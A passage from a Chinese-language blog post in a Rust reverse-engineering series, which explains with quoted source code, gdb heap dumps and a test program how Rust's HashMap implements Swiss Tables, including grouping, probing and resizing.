<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[inline]</span></span><br><span class="line"><span class="meta">#[allow(clippy::cast_possible_truncation)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">h2</span>(hash: <span class="type">u64</span>) <span class="punctuation">-&gt;</span> <span class="type">u8</span> &#123;</span><br><span class="line">    <span class="comment">// Grab the top 7 bits of the hash. While the hash is normally a full 64-bit</span></span><br><span class="line">    <span class="comment">// value, some hash functions (such as FxHash) produce a usize result</span></span><br><span class="line">    <span class="comment">// instead, which means that the top 32 bits are 0 on 32-bit platforms.</span></span><br><span class="line">    <span class="comment">// So we use MIN_HASH_LEN constant to handle this.</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">top7</span> = hash &gt;&gt; (MIN_HASH_LEN * <span class="number">8</span> - <span class="number">7</span>);</span><br><span class="line">    (top7 &amp; <span class="number">0x7f</span>) <span class="keyword">as</span> <span class="type">u8</span> <span class="comment">// truncation</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>破案了，这里获取了hash的最高7位，经过调试证实，堆空间中一串0xFF中间掺杂的其他数据就是这些Hash值的最高7位。通过这个方法名，实际上已经可以在网上找到这个HashMap的算法了——Swiss Tables。经过简单了解后发现，它与Rust中的实现高度吻合。这是一种较新的高效HashMap算法，需要保存Key和Value本身，通过若干个16字节大小的桶进行索引。具体的算法实现可见<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/277732297">传送门</a>，下面也将进行简单介绍。</p>
<h2 id="swiss-tables"><a class="markdownIt-Anchor" href="#swiss-tables"></a> Swiss Tables</h2>
<h3 id="data-structure"><a class="markdownIt-Anchor" href="#data-structure"></a> Data Structure</h3>
<p>这个算法包含两个最为重要的数据结构，第一是若干个Group，每一个Group都是一个长度固定为16的数组，所有元素均为键值对，这里称每一个数组项为桶（Bucket）。第二是控制字节（Control Bytes）数组，对于每一个Group中的每一个元素，都有一个1字节的控制字节，因此控制字节数组的字节数量等于Group数量乘以16。</p>
<p>在这个算法中，需要对Hash进行如下操作：将Hash值截为无符号64位值（Rust中如果使用默认Hash算法，其输出就是无符号64位值，因此无需截断），随后分为最高7位与余下的57位。最高7位将被用来填充保存该元素的桶的控制字节的低7位，最高1位另有作用。余下的57位将用于确定将这个值保存在哪个Group中。在Rust中，控制字节为全1代表这个桶为空，为128代表这个桶被删除。</p>
<p>为方便说明，下面的所有图中，以绿色代表桶空，黄色代表满，红色代表已删除。</p>
<p><img src="1.png" alt="" /></p>
<h3 id="insertdeletefind"><a class="markdownIt-Anchor" href="#insertdeletefind"></a> Insert/Delete/Find</h3>
<p>那么这里就出现了一个问题：如果57位只是用来确定应该保存在哪个组，那么应该如何确定保存到组中的哪个桶呢？实际上这个问题根本不需要考虑，因为Swiss Tables充分考虑了现代CPU浮点数架构的性能优化，对于一个组，它的控制字节一共16字节，正好是一个浮点寄存器的大小，在实际实现的时候可以通过使用浮点数指令来进行加速，无论元素被保存到一个组中的哪个桶，都能够在固定的时间完成对一组的查找下面通过查找来简单说明。</p>
<p>如果需要查找某个Key，首先计算Hash值，随后获取高7位与其应该保存到的组的索引值，为方便说明，假设高7位为0x18。下面首先要完成的工作是尝试匹配高7字节，即在这个桶的16字节中尝试找到一个字节的值为0x18。找到之后还需要进一步比较Key值是否真的相等，因为7字节的空间很小容易发生碰撞。如果没有匹配到，需要判断这个组是否已经填满。因为Swiss Tables的插入规则中包含这样一条：当目标组已满时，需要判断该组的下一个组是否全满，如果不是则保存到下一个组，如果是则继续向下查找。也就是说，在查找的时候如果发现目标组已经填满且组中没有找到Key，则还需要向下查找下面的组，直到查找到Key或检测到某个组不是全满为止。</p>
<p><img src="2.png" alt="" /></p>
<p>以上图为例，如果现在需要查找3这个Key，Hash高7位为0x18，计算出的Hash值表示它应该被保存到组1中。但在插入时由于组1已满，因此被插入到组2中。在查找时，可首先通过一条浮点数指令将1个字节的值复制到16个字节的浮点数寄存器中，使浮点数寄存器的16个字节的值都等于0x18，随后使用两条浮点数指令将16个控制字节与浮点数寄存器进行逐字节比较获取16字节输出，相同的字节在输出中对应为值1，不同为0。最后获取到所有控制字节匹配的桶，进行Key的比较。</p>
<p>在上图的例子中，对组1进行匹配时发现没有找到3，且注意到这个组全满，因此需要继续匹配下面一组，在下面一组中找到了3这个Key，查找完成，Hit。</p>
<p>如果要查找6这个Key，且它的Hash值高7位也是0x18，那么在查找到组2没有找到后，还需要查找组3，组3中也没有，但组3不是全满，因此判断HashMap中不存在6这个Key，Miss。</p>
<p>从上面的分析可以看出，Swiss Tables在插入时遵循线性探测规则。根据上面所述的规则，我们能够基本完成对HashMap的插入、删除与查询操作。</p>
<p>不过上面的查找算法还有一个问题需要解决：对于已经删除的项，是应该将其视作满还是空？考虑一下：如果将删除项视作空，那么对于一堆全满的连续的多个组，在每个组中都可能保存有原本应该保存在这一堆中第一个组的元素，却因为前面的组都满了而被赶到了后面保存，将其视作空就相当于是减少了连续的全满的组的数量，假设有原本应该保存在组1的元素a被保存到组4，而组3删除了一个元素，那么在查找a的时候，只是找到组3就会退出，这样显然是错误的。因此查找时，对于已删除元素，应将其看做桶满。</p>
<h3 id="expand"><a class="markdownIt-Anchor" href="#expand"></a> Expand</h3>
<p>下面，我们还需要解决这个算法中的一个重要部分：扩容。如果所有组中空闲桶数量不足需要扩充，扩充前后同一个元素的Hash值计算出来应该保存到的组的索引有可能不同，这样原本应该保存到同一个组的元素可能会保存到相距很远的不同组中。举例说明，如果后57位确定组是通过将值对组数取模得到，那么对于一个原来有4组的HashMap，将其扩充到8组后，Hash值为0x5的数据在扩容前应该被保存到组1，但扩容后则会被保存到组5。扩容后若进行查找，也是从组5开始查找，此时无法查找到组1的这个数据。这个问题如何解决？如果组的数量没有即使扩充，当产生的连续全满组数量较多时，有可能会导致一次查找需要遍历所有这些全满组，导致效率有所降低，这个问题如何解决？</p>
<p>千言万语都说明，我们需要一个正确的高效的扩容算法。但很可惜的是，扩容算法的解释在网络中几乎没有，针对Swiss Tables的介绍大多是针对前面三种操作以及分析其查询效率为什么高。那么下面，我们将通过实际的试验验证Rust中HashMap的扩容策略。</p>
<p>首先，我们需要明确Rust HashMap在什么时候扩容。通过查看Rust源码发现了这样一个方法：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">bucket_mask_to_capacity</span>(bucket_mask: <span class="type">usize</span>) <span class="punctuation">-&gt;</span> <span class="type">usize</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> bucket_mask &lt; <span class="number">8</span> &#123;</span><br><span class="line">        <span class="comment">// For tables with 1/2/4/8 buckets, we always reserve one empty slot.</span></span><br><span class="line">        <span class="comment">// Keep in mind that the bucket mask is one less than the bucket count.</span></span><br><span class="line">        bucket_mask</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// For larger tables we reserve 12.5% of the slots as empty.</span></span><br><span class="line">        ((bucket_mask + <span class="number">1</span>) / <span class="number">8</span>) * <span class="number">7</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从注释中可以看出，对于桶数量为1/2/4/8的HashMap，Rust总是保留一个空的桶，而更大的HashMap则保留1/8的桶为空。这一点可以通过反复调用HashMap的<code>capacity</code>方法找到端倪。当我们一个个插入数据的时候，输出的capacity去重后是这样一个序列：3, 7, 14(16x7÷8), 28(32x7÷8), 56(64x7÷8), …。</p>
<p>接下来，这里重点探究一下Rust HashMap在扩容前后数据位置的变化情况。笔者本来是想通过直接搜索源码查找相关代码的，但找了半天无功而返，因此只得寻求动态调试的帮助。结果很简单就找到了，但是不知道为什么，调试显示的行与实际行不同。下面找到了一个resize，但是看不懂：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsafe</span> <span class="keyword">fn</span> <span class="title function_">resize</span>(</span><br><span class="line">    &amp;<span class="keyword">mut</span> <span class="keyword">self</span>,</span><br><span class="line">    capacity: <span class="type">usize</span>,</span><br><span class="line">    hasher: <span class="keyword">impl</span> <span class="title class_">Fn</span>(&amp;T) <span class="punctuation">-&gt;</span> <span class="type">u64</span>,</span><br><span class="line">    fallibility: Fallibility,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;(), TryReserveError&gt; &#123;</span><br><span class="line">    <span class="comment">// SAFETY:</span></span><br><span class="line">    <span class="comment">// 1. The caller of this function guarantees that `capacity &gt;= self.table.items`.</span></span><br><span class="line">    <span class="comment">// 2. We know for sure that `alloc` and `layout` matches the [`Allocator`] and</span></span><br><span class="line">    <span class="comment">//    [`TableLayout`] that were used to allocate this table.</span></span><br><span class="line">    <span class="comment">// 3. The caller ensures that the control bytes of the `RawTableInner`</span></span><br><span class="line">    <span class="comment">//    are already initialized.</span></span><br><span class="line">    <span class="keyword">self</span>.table.<span class="title function_ invoke__">resize_inner</span>(</span><br><span class="line">        &amp;<span class="keyword">self</span>.alloc,</span><br><span class="line">        capacity,</span><br><span class="line">        &amp;|table, index| <span class="title function_ invoke__">hasher</span>(table.bucket::&lt;T&gt;(index).<span class="title function_ invoke__">as_ref</span>()),</span><br><span class="line">        fallibility,</span><br><span class="line">        <span class="keyword">Self</span>::TABLE_LAYOUT,</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[allow(clippy::inline_always)]</span></span><br><span class="line"><span class="meta">#[inline(always)]</span></span><br><span class="line"><span class="keyword">unsafe</span> <span class="keyword">fn</span> <span class="title function_">resize_inner</span>&lt;A&gt;(</span><br><span class="line">    &amp;<span class="keyword">mut</span> <span class="keyword">self</span>,</span><br><span class="line">    alloc: &amp;A,</span><br><span class="line">    capacity: <span class="type">usize</span>,</span><br><span class="line">    hasher: &amp;<span class="keyword">dyn</span> <span class="title function_ invoke__">Fn</span>(&amp;<span class="keyword">mut</span> <span class="keyword">Self</span>, <span class="type">usize</span>) <span class="punctuation">-&gt;</span> <span class="type">u64</span>,</span><br><span class="line">    fallibility: Fallibility,</span><br><span class="line">    layout: TableLayout,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;(), TryReserveError&gt;</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    A: Allocator,</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// SAFETY: We know for sure that `alloc` and `layout` matches the [`Allocator`] and [`TableLayout`]</span></span><br><span class="line">    <span class="comment">// that were used to allocate this table.</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">new_table</span> = <span class="keyword">self</span>.<span class="title function_ invoke__">prepare_resize</span>(alloc, layout, capacity, fallibility)?;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SAFETY: We know for sure that RawTableInner will outlive the</span></span><br><span class="line">    <span class="comment">// returned `FullBucketsIndices` iterator, and the caller of this</span></span><br><span class="line">    <span class="comment">// function ensures that the control bytes are properly initialized.</span></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">full_byte_index</span> <span class="keyword">in</span> <span class="keyword">self</span>.<span class="title function_ invoke__">full_buckets_indices</span>() &#123;</span><br><span class="line">        <span class="comment">// This may panic.</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">hash</span> = <span class="title function_ invoke__">hasher</span>(<span class="keyword">self</span>, full_byte_index);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// SAFETY:</span></span><br><span class="line">        <span class="comment">// We can use a simpler version of insert() here since:</span></span><br><span class="line">        <span class="comment">// 1. There are no DELETED entries.</span></span><br><span class="line">        <span class="comment">// 2. We know there is enough space in the table.</span></span><br><span class="line">        <span class="comment">// 3. All elements are unique.</span></span><br><span class="line">        <span class="comment">// 4. The caller of this function guarantees that `capacity &gt; 0`</span></span><br><span class="line">        <span class="comment">//    so `new_table` must already have some allocated memory.</span></span><br><span class="line">        <span class="comment">// 5. We set `growth_left` and `items` fields of the new table</span></span><br><span class="line">        <span class="comment">//    after the loop.</span></span><br><span class="line">        <span class="comment">// 6. We insert into the table, at the returned index, the data</span></span><br><span class="line">        <span class="comment">//    matching the given hash immediately after calling this function.</span></span><br><span class="line">        <span class="keyword">let</span> (new_index, _) = new_table.<span class="title function_ invoke__">prepare_insert_slot</span>(hash);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// SAFETY:</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// * `src` is valid for reads of `layout.size` bytes, since the</span></span><br><span class="line">        <span class="comment">//   table is alive and the `full_byte_index` is guaranteed to be</span></span><br><span class="line">        <span class="comment">//   within bounds (see `FullBucketsIndices::next_impl`);</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// * `dst` is valid for writes of `layout.size` bytes, since the</span></span><br><span class="line">        <span class="comment">//   caller ensures that `table_layout` matches the [`TableLayout`]</span></span><br><span class="line">        <span class="comment">//   that was used to allocate old table and we have the `new_index`</span></span><br><span class="line">        <span class="comment">//   returned by `prepare_insert_slot`.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// * Both `src` and `dst` are properly aligned.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// * Both `src` and `dst` point to different region of memory.</span></span><br><span class="line">        ptr::<span class="title function_ invoke__">copy_nonoverlapping</span>(</span><br><span class="line">            <span class="keyword">self</span>.<span class="title function_ invoke__">bucket_ptr</span>(full_byte_index, layout.size),</span><br><span class="line">            new_table.<span class="title function_ invoke__">bucket_ptr</span>(new_index, layout.size),</span><br><span class="line">            layout.size,</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The hash function didn&#x27;t panic, so we can safely set the</span></span><br><span class="line">    <span class="comment">// `growth_left` and `items` fields of the new table.</span></span><br><span class="line">    new_table.growth_left -= <span class="keyword">self</span>.items;</span><br><span class="line">    new_table.items = <span class="keyword">self</span>.items;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// We successfully copied all elements without panicking. Now replace</span></span><br><span class="line">    <span class="comment">// self with the new table. The old table will have its memory freed but</span></span><br><span class="line">    <span class="comment">// the items will not be dropped (since they have been moved into the</span></span><br><span class="line">    <span class="comment">// new table).</span></span><br><span class="line">    <span class="comment">// SAFETY: The caller ensures that `table_layout` matches the [`TableLayout`]</span></span><br><span class="line">    <span class="comment">// that was used to allocate this table.</span></span><br><span class="line">    mem::<span class="title function_ invoke__">swap</span>(<span class="keyword">self</span>, &amp;<span class="keyword">mut</span> new_table);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写到这里，笔者已经被这个问题纠缠了两周，不堪忍受的我决定开始人肉找规律，将所有的Hash值转换为二进制，看看归于同一组的Hash到底有什么相同之处。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Inserted 1, hash = 33bd1e335a4e43f0, h2 = 19, map capacity = 3</span><br><span class="line">Inserted 3, hash = 56303fd171416940, h2 = 2b, map capacity = 3</span><br><span class="line">Inserted 15, hash = cde8088c422f9d0, h2 = 6, map capacity = 3</span><br><span class="line">Inserted 22, hash = 411807d47ecb5b61, h2 = 20, map capacity = 7</span><br><span class="line">Inserted 23, hash = bbf28bf43ce33881, h2 = 5d, map capacity = 7</span><br><span class="line">Inserted 45, hash = 217bed8f242fc391, h2 = 10, map capacity = 7</span><br><span class="line">Inserted 46, hash = d97613d73c3edd81, h2 = 6c, map capacity = 7</span><br><span class="line">Inserted 48, hash = ec9ec7fbb5226711, h2 = 76, map capacity = e</span><br><span class="line">Inserted 53, hash = ea21590131a0aad0, h2 = 75, map capacity = e</span><br><span class="line">Inserted 55, hash = 6e28ebd650236d51, h2 = 37, map capacity = e</span><br><span class="line">Inserted 59, hash = 263478baaf15b7f1, h2 = 13, map capacity = e</span><br><span class="line">Inserted 60, hash = 2aebb2b8fdb4f070, h2 = 15, map capacity = e</span><br><span class="line">Inserted 73, hash = 163193d2c2c5b7c1, h2 = b, map capacity = e</span><br><span class="line">Inserted 78, hash = a8f5a0a55cea2e21, h2 = 54, map capacity = e</span><br><span class="line">Inserted 85, hash = dbe1512d01714890, h2 = 6d, map capacity = 1c</span><br><span class="line">Inserted 87, hash = 1159a3327874fea1, h2 = 8, map capacity = 1c</span><br><span class="line"></span><br><span class="line">22:0110│  0x5555555bdf40 ◂— 0x1513377576100619</span><br><span class="line">23:0118│  0x5555555bdf48 ◂— 0xffffffffffffff6d</span><br><span class="line">24:0120│  0x5555555bdf50 ◂— 0xff08540b6c5d202b</span><br><span class="line">25:0128│  0x5555555bdf58 ◂— 0xffffffffffffffff</span><br><span class="line"></span><br><span class="line">0011 0011 1011 1101 0001 1110 0011 0011 0101 1010 0100 1110 0100 0011 1111 0000</span><br><span class="line">0000 1100 1101 1110 1000 0000 1000 1000 1100 0100 0010 0010 1111 1001 1101 0000</span><br><span class="line">0010 0001 0111 1011 1110 1101 1000 1111 0010 0100 0010 1111 1100 0011 1001 0001</span><br><span class="line">1110 1100 1001 1110 1100 0111 1111 1011 1011 0101 0010 0010 0110 0111 0001 0001</span><br><span class="line">1110 1010 0010 0001 0101 1001 0000 0001 0011 0001 1010 0000 1010 1010 1101 0000</span><br><span class="line">0110 1110 0010 1000 1110 1011 1101 0110 0101 0000 0010 0011 0110 1101 0101 0001</span><br><span class="line">0010 0110 0011 0100 0111 1000 1011 1010 1010 1111 0001 0101 1011 0111 1111 0001</span><br><span class="line">0010 1010 1110 1011 1011 0010 1011 1000 1111 1101 1011 0100 1111 0000 0111 0000</span><br><span class="line">1101 1011 1110 0001 0101 0001 0010 1101 0000 0001 0111 0001 0100 1000 1001 0000</span><br><span class="line"></span><br><span class="line">0101 0110 0011 0000 0011 1111 1101 0001 0111 0001 0100 0001 0110 1001 0100 0000</span><br><span class="line">0100 0001 0001 1000 0000 0111 1101 0100 0111 1110 1100 1011 0101 1011 0110 0001</span><br><span class="line">1011 1011 1111 0010 1000 1011 1111 0100 0011 1100 1110 0011 0011 1000 1000 0001</span><br><span class="line">1101 1001 0111 0110 0001 0011 1101 0111 0011 1100 0011 1110 1101 1101 1000 0001</span><br><span class="line">0001 0110 0011 0001 1001 0011 1101 0010 1100 0010 1100 0101 1011 0111 1100 0001</span><br><span class="line">1010 1000 1111 0101 1010 0000 1010 0101 0101 1100 1110 1010 0010 1110 0010 0001</span><br><span class="line">0001 0001 0101 1001 1010 0011 0011 0010 0111 1000 0111 0100 1111 1110 1010 0001</span><br></pre></td></tr></table></figure>
<p>上面最后的几大行二进制数据中，上面的是保存到第一组的Hash，下面的是保存到第二组的Hash，看出来有什么规律了吗？可以发现，上面的Hash中所有的第5低的bit均为1，下面的均为0。为了严谨考虑，笔者增加了数据量进行了进一步测试，发现当组数为4时，是按照第5低bit和第6低bit来判断一个数据应该被分到哪组。</p>
<p>至此，我们最终通过实验获知了Rust中的HashMap的分组方式，与传统的SwissTable不同，分组的标志位从第5低bit开始，这也是为什么笔者一开始找了很长时间源码与规律依然一无所获。</p>
<p>下面是笔者的测试程序，读者可以将这个程序编译后通过gdb调试进行HashMap内存空间的一一比对。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::collections::HashMap;</span><br><span class="line"><span class="keyword">use</span> std::hash::&#123;BuildHasher, Hash, Hasher&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rs</span> = std::collections::hash_map::RandomState::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">map</span>: HashMap&lt;<span class="type">u64</span>, <span class="type">u64</span>&gt; = HashMap::<span class="title function_ invoke__">with_hasher</span>(rs);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">ctr</span> = [<span class="number">0</span>;<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">1000u64</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">hasher</span> = map.<span class="title function_ invoke__">hasher</span>().<span class="title function_ invoke__">build_hasher</span>();</span><br><span class="line">        i.<span class="title function_ invoke__">hash</span>(&amp;<span class="keyword">mut</span> hasher);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">hash</span> = hasher.<span class="title function_ invoke__">finish</span>();</span><br><span class="line">        <span class="keyword">if</span> ctr[(hash <span class="keyword">as</span> <span class="type">usize</span> &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span>] == <span class="number">13</span> &#123; <span class="keyword">continue</span> &#125;</span><br><span class="line">        <span class="keyword">if</span> ctr[<span class="number">0</span>] + ctr[<span class="number">1</span>] + ctr[<span class="number">2</span>] + ctr[<span class="number">3</span>] == <span class="number">13</span> * <span class="number">4</span> &#123; <span class="keyword">break</span> &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">h2</span> = hash &gt;&gt; <span class="number">57</span>;</span><br><span class="line">        map.<span class="title function_ invoke__">insert</span>(i, i);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Inserted &#123;i:&lt;02&#125;, hash = &#123;hash:&lt;064b&#125;, h1(suspected) = &#123;:x&#125;, h2 = &#123;:x&#125;, map capacity = &#123;:x&#125;&quot;</span>,</span><br><span class="line">                 (hash &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span>, h2, map.<span class="title function_ invoke__">capacity</span>());</span><br><span class="line">        ctr[(hash <span class="keyword">as</span> <span class="type">usize</span> &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span>] += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Finished!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在实际测试过程中，当数据量较大时，经常需要线性后移，即当前组已满，需要将Hash值移动到后面一个组中。实际调试时发现，一个组中似乎最多只会保存15个数据而不是填充满，在几次调试后均未发现填充满的组。</p>
<p>另外需要注意的是，在保存HashMap的堆Chunk中，数据的排布方式有一些独特。数据保存在SwissTable之前，设SwissTable的起始地址为x，那么x+i处标志字节所对应的数据地址位于x-sizeof(key+value)*i，笔者猜测这样是为了便于Rust进行寻址，因为对HashMap的操作中，普遍是传入的SwissTable地址而非数据的起始地址，这样可以在不知道数据起始地址的情况下快速对应到数据。而对于SwissTable，若实际的组数为2<sup>n</sup>，那么保存到堆中的组应该为2<sup>n</sup>+1，最后一组与第一组的数据相同。这可能是为了在最后一组满且需要保存数据时能够快速检测到需要遍历到第一组添加数据。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
<p>本文的信息量比较大，下面我们来简单总结一下。</p>
<ul>
<li>对于Rust，其HashMap的底层实现是SwissTable，这是一种高效的HashMap算法。</li>
<li>Rust在HashMap中使用的默认Hash算法是SipHash算法。</li>
<li>Rust会保证所有组至少留出1/8的空闲空间，如果下一次添加数据打破了这一规则，Rust将对组进行扩充。</li>
<li>Rust将Hash去掉最低4位和最高7位，剩余的值作为组的索引值，其值对组数取模后的值即为一个键值对应该被保存的组号。如果组满则实行线性规则在后面的组中插入。</li>
<li>Rust在初始化HashMap时使用两个随机数作为Hash算法的参数，这使得相同的键值对在不同的HashMap中计算的Hash值也不同。</li>
<li>Rust的HashMap其余规则与SwissTable定义的规则没有什么太大的区别。</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/11/26/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/26/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-6/" class="post-title-link" itemprop="url">Rust逆向学习 (6)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-11-26 17:54:46 / Modified: 23:16:09" itemprop="dateCreated datePublished" datetime="2023-11-26T17:54:46+08:00">2023-11-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
